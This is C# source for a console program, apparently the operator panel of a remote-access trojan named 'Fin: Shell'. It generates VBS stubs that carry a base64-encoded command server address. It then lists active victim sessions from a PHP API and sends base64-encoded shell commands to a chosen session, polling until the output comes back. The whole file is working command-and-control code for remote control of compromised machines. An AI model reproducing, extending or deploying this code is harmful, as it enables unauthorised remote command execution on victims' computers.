using Fin.Properties;
using System;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Text;

namespace ConsoleApp1
{
    internal class Program
    {
        static string Url = "http://www.ru";
        static string Url_filename = "api.php";

        static string Base64Encode(string plainText)
        {
            var plainTextBytes = Encoding.UTF8.GetBytes(plainText);
            return Convert.ToBase64String(plainTextBytes);
        }

        static string GetRequest(string url, string request)
        {
            using (var client = new HttpClient(new HttpClientHandler { AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate }))
            {
                client.BaseAddress = new Uri(url);
                HttpResponseMessage response = client.GetAsync(request).Result;
                response.EnsureSuccessStatusCode();

                return response.Content.ReadAsStringAsync().Result;
            }
        }

        static void Main(string[] args)
        {
            Console.Title = "[C0d3zzz] Fin: Shell _/`(•.•)_/`";
            Console.Write("   Select menu:\n      1: Generate new stub (.VBS)\n      2: Active sessions\n> ");
            string Selected = Console.ReadLine();

            switch (Selected)
            {
                case "1":
                    {
                        Console.Clear();
                        string sh = Resources.sh;

                        Console.Write("> Enter address API (http://www.ru/api.php): ");
                        string address = Console.ReadLine();

                        Console.Write("\n> Enter filename: ");
                        string filename = Console.ReadLine().Replace(".vbs", "");

                        File.WriteAllText(filename + ".vbs", sh.Replace("{URL}", Base64Encode(address)).Replace("{FILENAME}", filename));
                        Console.Write("> File created successfully...");
                        Console.ReadKey();

                        System.Diagnostics.Process.Start(System.Reflection.Assembly.GetExecutingAssembly().Location);
                    }
                    break;

                case "2":
                    {
                        while (true)
                        {
                            Console.Clear();

                            string sessions = GetRequest($"{Url}/", $"{Url_filename}?sessions=active");

                            Console.Write($"\n   All active sessions:\n{sessions}\n\n> Select [IP,Text: Updates]: ");
                            string Write = Console.ReadLine();

                            if (Write.ToLower() == "updates") { }
                            else if (Write.Length > 8)
                            {
                                Console.Clear();
                                Console.Write("\n   ~shell: ");
                                string cmd = Console.ReadLine();

                                GetRequest($"{Url}/", $"{Url_filename}?session={Write}&cmd=" + Base64Encode(cmd));

                                while (true)
                                {
                                    string result = GetRequest($"{Url}/", $"{Url_filename}?session={Write}&get=true");

                                    if (!string.IsNullOrEmpty(result))
                                    {
                                        Console.Clear();
                                        Console.WriteLine(result);
                                        Console.ReadKey();

                                        break;
                                    }
                                }
                            }
                            else
                            {
                                Console.WriteLine("   Invalid command.");
                                Console.ReadKey();
                            }
                        }
                    }
                    break;
            }
        }
    }
}
